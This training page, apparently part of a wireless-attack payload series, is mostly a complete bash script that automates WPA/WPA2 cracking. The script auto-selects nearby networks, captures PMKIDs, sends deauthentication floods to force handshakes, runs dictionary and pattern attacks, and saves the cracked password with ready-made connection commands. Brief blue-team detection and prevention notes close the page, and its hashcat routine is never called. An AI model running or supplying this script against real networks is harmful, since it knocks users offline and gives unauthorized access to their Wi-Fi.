# PP-A03: Automated WPA Cracker

## Overview

| Attribute | Value |
|-----------|-------|
| **Payload ID** | PP-A03 |
| **Name** | Automated WPA Cracker |
| **Category** | Advanced Attack |
| **Target** | WPA/WPA2 Networks |
| **Skill Level** | Advanced |
| **Risk Level** | High |

## Description

A fully automated WPA/WPA2 cracking system that handles handshake capture, PMKID extraction, dictionary attacks, and rule-based cracking. Supports multiple wordlists and can distribute cracking across available resources.

---

## Complete Payload

```bash
#!/bin/bash
#####################################################
# Payload: PP-A03 - Automated WPA Cracker
# Target: WPA/WPA2 Protected Networks
# Category: Advanced Attack
# Author: Security Trainer
# Version: 1.0.0
#
# WARNING: For authorized security testing only
#####################################################

# ============================================
# CONFIGURATION
# ============================================

# Target specification
TARGET_BSSID="${1:-}"
TARGET_CHANNEL="${2:-}"
TARGET_SSID="${3:-}"

# Interfaces
MONITOR_IF="wlan1"

# Directories
LOOT_DIR="/sd/loot/wpa_crack_$(date +%Y%m%d_%H%M%S)"
CAPTURE_DIR="$LOOT_DIR/captures"
CRACK_DIR="$LOOT_DIR/cracking"
LOG_FILE="$LOOT_DIR/crack.log"

# Wordlists (in order of priority)
WORDLISTS=(
    "/sd/wordlists/rockyou.txt"
    "/sd/wordlists/common_wifi.txt"
    "/sd/wordlists/top10000.txt"
    "/usr/share/wordlists/passwords.txt"
)

# Timing
CAPTURE_TIMEOUT=300      # 5 minutes for handshake
DEAUTH_INTERVAL=15       # Seconds between deauth bursts
DEAUTH_PACKETS=10        # Packets per burst
MAX_CRACK_TIME=3600      # 1 hour max crack time

# Modes
USE_PMKID="${USE_PMKID:-true}"
USE_HASHCAT="${USE_HASHCAT:-false}"
DICTIONARY_ONLY="${DICTIONARY_ONLY:-false}"

# ============================================
# LED & LOGGING
# ============================================

LED_BASE="/sys/class/leds"

led() {
    local color="$1"
    local state="$2"
    echo "$state" > "${LED_BASE}/pineapple:${color}:system/brightness" 2>/dev/null
}

led_status() {
    case "$1" in
        "scanning")   led "blue" 1; led "green" 0; led "red" 0 ;;
        "capturing")  led "amber" 1; led "blue" 1 ;;
        "cracking")   led "amber" 1 ;;
        "success")    led "green" 1; led "blue" 0; led "red" 0 ;;
        "failed")     led "red" 1 ;;
        "off")        led "red" 0; led "green" 0; led "blue" 0; led "amber" 0 ;;
    esac
}

log() {
    local message="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $message" | tee -a "$LOG_FILE"
}

notify_success() {
    local ssid="$1"
    local password="$2"

    log "=========================================="
    log "SUCCESS! PASSWORD FOUND"
    log "SSID: $ssid"
    log "Password: $password"
    log "=========================================="

    # LED celebration
    for i in {1..10}; do
        led "green" 1
        sleep 0.2
        led "green" 0
        sleep 0.1
    done
    led "green" 1
}

# ============================================
# TARGET SCANNING
# ============================================

scan_targets() {
    log "Scanning for WPA/WPA2 networks..."
    led_status "scanning"

    airmon-ng check kill >/dev/null 2>&1
    airmon-ng start "$MONITOR_IF" >/dev/null 2>&1
    MON="${MONITOR_IF}mon"

    local scan_file="$CAPTURE_DIR/scan"

    # Quick scan for targets
    timeout 30 airodump-ng \
        --band abg \
        -w "$scan_file" \
        -o csv \
        "$MON" 2>/dev/null

    # Parse results
    if [ -f "${scan_file}-01.csv" ]; then
        log "Parsing scan results..."

        grep -E "WPA|WPA2" "${scan_file}-01.csv" | while IFS=',' read -r bssid first last channel speed privacy cipher auth power beacons iv lanip idlen essid key; do
            bssid=$(echo "$bssid" | xargs)
            channel=$(echo "$channel" | xargs)
            power=$(echo "$power" | xargs)
            essid=$(echo "$essid" | xargs)
            privacy=$(echo "$privacy" | xargs)

            if [ -n "$bssid" ] && [ -n "$essid" ]; then
                echo "$bssid,$channel,$power,$privacy,$essid" >> "$CAPTURE_DIR/wpa_targets.csv"
            fi
        done

        local target_count=$(wc -l < "$CAPTURE_DIR/wpa_targets.csv" 2>/dev/null || echo 0)
        log "Found $target_count WPA/WPA2 networks"
    fi

    airmon-ng stop "$MON" >/dev/null 2>&1
}

select_target() {
    if [ -n "$TARGET_BSSID" ] && [ -n "$TARGET_CHANNEL" ]; then
        log "Using specified target: $TARGET_BSSID"
        return 0
    fi

    if [ ! -f "$CAPTURE_DIR/wpa_targets.csv" ]; then
        scan_targets
    fi

    if [ ! -s "$CAPTURE_DIR/wpa_targets.csv" ]; then
        log "ERROR: No WPA targets found"
        return 1
    fi

    # Select strongest signal
    local best=$(sort -t',' -k3 -rn "$CAPTURE_DIR/wpa_targets.csv" | head -1)
    TARGET_BSSID=$(echo "$best" | cut -d',' -f1)
    TARGET_CHANNEL=$(echo "$best" | cut -d',' -f2)
    TARGET_SSID=$(echo "$best" | cut -d',' -f5)

    log "Auto-selected target:"
    log "  SSID: $TARGET_SSID"
    log "  BSSID: $TARGET_BSSID"
    log "  Channel: $TARGET_CHANNEL"

    return 0
}

# ============================================
# PMKID CAPTURE
# ============================================

capture_pmkid() {
    if [ "$USE_PMKID" != "true" ]; then
        return 1
    fi

    log "Attempting PMKID capture..."
    led_status "capturing"

    airmon-ng check kill >/dev/null 2>&1
    airmon-ng start "$MONITOR_IF" >/dev/null 2>&1
    MON="${MONITOR_IF}mon"

    local pmkid_file="$CAPTURE_DIR/pmkid"

    # Use hcxdumptool if available
    if command -v hcxdumptool >/dev/null 2>&1; then
        log "Using hcxdumptool for PMKID capture..."

        # Create filter
        echo "${TARGET_BSSID//:}" > /tmp/filter_mac.txt

        timeout 60 hcxdumptool \
            -i "$MON" \
            --filterlist_ap=/tmp/filter_mac.txt \
            --filtermode=2 \
            -o "$pmkid_file.pcapng" \
            --enable_status=1 2>/dev/null

        # Convert to hash format
        if [ -f "$pmkid_file.pcapng" ]; then
            if command -v hcxpcapngtool >/dev/null 2>&1; then
                hcxpcapngtool -o "$pmkid_file.22000" "$pmkid_file.pcapng" 2>/dev/null

                if [ -s "$pmkid_file.22000" ]; then
                    log "PMKID captured successfully!"
                    airmon-ng stop "$MON" >/dev/null 2>&1
                    return 0
                fi
            fi
        fi
    fi

    log "PMKID capture unsuccessful, falling back to handshake"
    airmon-ng stop "$MON" >/dev/null 2>&1
    return 1
}

# ============================================
# HANDSHAKE CAPTURE
# ============================================

capture_handshake() {
    log "Starting handshake capture..."
    led_status "capturing"

    airmon-ng check kill >/dev/null 2>&1
    airmon-ng start "$MONITOR_IF" >/dev/null 2>&1
    MON="${MONITOR_IF}mon"

    local capture_file="$CAPTURE_DIR/handshake"

    # Start capture
    log "Capturing on channel $TARGET_CHANNEL, BSSID $TARGET_BSSID"
    airodump-ng \
        -c "$TARGET_CHANNEL" \
        --bssid "$TARGET_BSSID" \
        -w "$capture_file" \
        "$MON" &
    CAPTURE_PID=$!

    sleep 10  # Allow capture to initialize

    # Deauth loop
    local start_time=$(date +%s)
    local handshake_found=false

    log "Sending deauthentication packets..."

    while [ $(($(date +%s) - start_time)) -lt $CAPTURE_TIMEOUT ]; do
        # Send deauth burst
        aireplay-ng --deauth $DEAUTH_PACKETS \
            -a "$TARGET_BSSID" \
            "$MON" >/dev/null 2>&1

        # Check for handshake
        sleep $DEAUTH_INTERVAL

        if check_handshake "$capture_file-01.cap"; then
            handshake_found=true
            break
        fi

        log "Waiting for handshake... ($(($(date +%s) - start_time))s elapsed)"
    done

    kill $CAPTURE_PID 2>/dev/null
    airmon-ng stop "$MON" >/dev/null 2>&1

    if [ "$handshake_found" = true ]; then
        log "Handshake captured successfully!"
        cp "$capture_file-01.cap" "$CAPTURE_DIR/captured_handshake.cap"
        return 0
    else
        log "Handshake capture timeout"
        return 1
    fi
}

check_handshake() {
    local cap_file="$1"

    if [ ! -f "$cap_file" ]; then
        return 1
    fi

    # Check with aircrack-ng
    if aircrack-ng "$cap_file" 2>&1 | grep -q "1 handshake"; then
        return 0
    fi

    # Alternative check with tcpdump
    if tcpdump -r "$cap_file" 2>/dev/null | grep -c "EAPOL" | grep -q "[4-9]"; then
        return 0
    fi

    return 1
}

# ============================================
# CRACKING FUNCTIONS
# ============================================

crack_password() {
    local capture_type="$1"  # "pmkid" or "handshake"
    local hash_file=""

    led_status "cracking"
    log "Starting password cracking..."

    mkdir -p "$CRACK_DIR"

    # Determine hash file
    if [ "$capture_type" = "pmkid" ] && [ -f "$CAPTURE_DIR/pmkid.22000" ]; then
        hash_file="$CAPTURE_DIR/pmkid.22000"
        log "Cracking PMKID hash..."
    elif [ -f "$CAPTURE_DIR/captured_handshake.cap" ]; then
        hash_file="$CAPTURE_DIR/captured_handshake.cap"
        log "Cracking handshake..."
    else
        log "ERROR: No hash/capture file found"
        return 1
    fi

    # Try each wordlist
    for wordlist in "${WORDLISTS[@]}"; do
        if [ -f "$wordlist" ]; then
            log "Trying wordlist: $wordlist"

            if crack_with_aircrack "$hash_file" "$wordlist"; then
                return 0
            fi
        fi
    done

    # Try common patterns if dictionary fails
    if [ "$DICTIONARY_ONLY" != "true" ]; then
        log "Dictionary attack unsuccessful, trying common patterns..."
        crack_with_patterns "$hash_file"
        return $?
    fi

    return 1
}

crack_with_aircrack() {
    local hash_file="$1"
    local wordlist="$2"

    log "Running aircrack-ng with $wordlist..."

    local result_file="$CRACK_DIR/aircrack_result.txt"

    timeout $MAX_CRACK_TIME aircrack-ng \
        -w "$wordlist" \
        -b "$TARGET_BSSID" \
        "$hash_file" > "$result_file" 2>&1

    if grep -q "KEY FOUND" "$result_file"; then
        local password=$(grep "KEY FOUND" "$result_file" | sed 's/.*\[ \(.*\) \].*/\1/')
        save_result "$password" "aircrack-ng" "$wordlist"
        return 0
    fi

    return 1
}

crack_with_patterns() {
    local hash_file="$1"

    log "Generating pattern-based wordlist..."

    local pattern_wordlist="$CRACK_DIR/patterns.txt"

    # Generate common patterns
    {
        # SSID variations
        echo "$TARGET_SSID"
        echo "${TARGET_SSID}123"
        echo "${TARGET_SSID}1234"
        echo "${TARGET_SSID}12345"
        echo "${TARGET_SSID}!"
        echo "${TARGET_SSID}@"
        echo "${TARGET_SSID}#"

        # Common WiFi passwords
        echo "password"
        echo "password1"
        echo "password123"
        echo "12345678"
        echo "123456789"
        echo "1234567890"
        echo "qwerty123"
        echo "letmein1"
        echo "welcome1"
        echo "admin123"

        # Year patterns
        for year in 2020 2021 2022 2023 2024 2025; do
            echo "${TARGET_SSID}${year}"
            echo "password${year}"
        done

        # Number sequences
        seq -w 00000000 00001000

    } > "$pattern_wordlist"

    crack_with_aircrack "$hash_file" "$pattern_wordlist"
    return $?
}

crack_with_hashcat() {
    local hash_file="$1"
    local wordlist="$2"

    if ! command -v hashcat >/dev/null 2>&1; then
        log "hashcat not available"
        return 1
    fi

    log "Running hashcat..."

    # Convert cap to hccapx if needed
    local hccapx_file="$CRACK_DIR/hash.hccapx"

    if [[ "$hash_file" == *.cap ]]; then
        if command -v cap2hccapx >/dev/null 2>&1; then
            cap2hccapx "$hash_file" "$hccapx_file"
        else
            log "cap2hccapx not available"
            return 1
        fi
    else
        hccapx_file="$hash_file"
    fi

    local result_file="$CRACK_DIR/hashcat_result.txt"

    # WPA hash mode: 22000 (new) or 2500 (old)
    hashcat -m 22000 \
        -a 0 \
        --potfile-path="$CRACK_DIR/hashcat.pot" \
        -o "$result_file" \
        "$hccapx_file" \
        "$wordlist" 2>/dev/null

    if [ -s "$result_file" ]; then
        local password=$(cat "$result_file" | cut -d':' -f4)
        save_result "$password" "hashcat" "$wordlist"
        return 0
    fi

    return 1
}

save_result() {
    local password="$1"
    local tool="$2"
    local wordlist="$3"

    log "PASSWORD FOUND!"

    # Save to credentials file
    cat > "$LOOT_DIR/CRACKED.txt" << EOF
========================================
WPA PASSWORD CRACKED
========================================

Target Information:
  SSID: $TARGET_SSID
  BSSID: $TARGET_BSSID
  Channel: $TARGET_CHANNEL

Cracked Password: $password

Cracking Details:
  Tool: $tool
  Wordlist: $wordlist
  Timestamp: $(date)

Connection Command:
  nmcli dev wifi connect "$TARGET_SSID" password "$password"

WPA Supplicant Config:
  network={
      ssid="$TARGET_SSID"
      psk="$password"
  }

========================================
EOF

    notify_success "$TARGET_SSID" "$password"
    return 0
}

# ============================================
# CLEANUP
# ============================================

cleanup() {
    log "Cleaning up..."
    led_status "off"

    # Stop monitor mode
    airmon-ng stop "${MONITOR_IF}mon" 2>/dev/null

    # Kill any running processes
    pkill -f airodump-ng 2>/dev/null
    pkill -f aireplay-ng 2>/dev/null
    pkill -f aircrack-ng 2>/dev/null
    pkill -f hcxdumptool 2>/dev/null

    # Generate summary
    generate_summary

    log "Results saved to: $LOOT_DIR"
    exit 0
}

generate_summary() {
    cat > "$LOOT_DIR/summary.txt" << EOF
========================================
WPA Cracking Summary
========================================

Operation Started: $(head -1 "$LOG_FILE" 2>/dev/null | cut -d']' -f1 | tr -d '[')
Operation Ended: $(date '+%Y-%m-%d %H:%M:%S')

Target:
  SSID: $TARGET_SSID
  BSSID: $TARGET_BSSID
  Channel: $TARGET_CHANNEL

Results:
EOF

    if [ -f "$LOOT_DIR/CRACKED.txt" ]; then
        echo "  Status: SUCCESS" >> "$LOOT_DIR/summary.txt"
        echo "  Password: $(grep "Cracked Password:" "$LOOT_DIR/CRACKED.txt" | cut -d: -f2 | xargs)" >> "$LOOT_DIR/summary.txt"
    else
        echo "  Status: Password not found" >> "$LOOT_DIR/summary.txt"
    fi

    cat >> "$LOOT_DIR/summary.txt" << EOF

Files:
$(ls -la "$LOOT_DIR/" 2>/dev/null)

EOF
}

trap cleanup SIGINT SIGTERM EXIT

# ============================================
# MAIN
# ============================================

main() {
    log "=========================================="
    log "PP-A03: Automated WPA Cracker"
    log "=========================================="

    mkdir -p "$CAPTURE_DIR" "$CRACK_DIR"

    # Select target
    if ! select_target; then
        led_status "failed"
        exit 1
    fi

    # Try PMKID first (clientless attack)
    if capture_pmkid; then
        log "PMKID captured, starting crack..."
        if crack_password "pmkid"; then
            led_status "success"
            exit 0
        fi
    fi

    # Fall back to handshake capture
    if capture_handshake; then
        log "Handshake captured, starting crack..."
        if crack_password "handshake"; then
            led_status "success"
            exit 0
        fi
    fi

    # If we get here, cracking failed
    led_status "failed"
    log "Password cracking unsuccessful"
    log "Captured files saved for offline cracking"
    exit 1
}

# ============================================
# EXECUTE
# ============================================

main "$@"
```

---

## Line-by-Line Breakdown

### PMKID vs Handshake

| Method | Advantage | Requirement |
|--------|-----------|-------------|
| PMKID | No client needed | AP must support RSN IE |
| Handshake | More universal | Active client required |

### Cracking Pipeline

```
1. capture_pmkid()
   └─▶ hcxdumptool → hcxpcapngtool → hash.22000

2. capture_handshake()
   └─▶ airodump-ng + aireplay-ng → .cap file

3. crack_password()
   ├─▶ crack_with_aircrack() - Dictionary attack
   ├─▶ crack_with_patterns() - Common patterns
   └─▶ crack_with_hashcat()  - GPU acceleration
```

### Wordlist Strategy (Lines 35-45)

Priority order:
1. `rockyou.txt` - Most common leaked passwords
2. `common_wifi.txt` - WiFi-specific passwords
3. `top10000.txt` - General top passwords
4. System wordlists as fallback

---

## Red Team Perspective

### Attack Efficiency

| Technique | Time | Success Rate |
|-----------|------|--------------|
| PMKID | 30-60s capture | Medium |
| Handshake | 1-5 min | High |
| Dictionary | Minutes-hours | Depends on wordlist |
| Brute force | Days-months | Exhaustive |

### Optimization Tips

1. **Custom Wordlists**: Create target-specific lists
2. **Rule-Based**: Apply hashcat rules (leetspeak, appends)
3. **GPU Cracking**: Transfer to powerful machine
4. **Distributed**: Split across multiple systems

---

## Blue Team Perspective

### Detection Indicators

| Attack Phase | Indicator |
|--------------|-----------|
| PMKID probe | RSN IE requests |
| Deauth | Multiple deauth frames |
| Handshake capture | Association/reassociation spikes |

### Prevention

```bash
# Strong password policy
# Minimum 12 characters, mixed case, numbers, symbols

# Monitor for deauth attacks
airodump-ng wlan0mon --berlin 60 2>&1 | grep -i "deauth"

# Use WPA3 where possible (immune to offline cracking)
```

---

## Practice Exercises

### Exercise 1: Custom Wordlist
Create a wordlist based on:
- Target organization name
- Location information
- Common password patterns

### Exercise 2: Rule Creation
Write hashcat rules that:
- Append years (2020-2025)
- Capitalize first letter
- Replace 'a' with '@'

### Exercise 3: Performance Analysis
Benchmark cracking speed with different:
- Wordlist sizes
- Hash types
- Hardware configurations

---

[← PP-A02 Multi-Stage Attack](PP-A02_Multi_Stage_Attack.md) | [Back to Advanced](README.md) | [Next: PP-A04 Wireless IDS Evasion →](PP-A04_WIDS_Evasion.md)
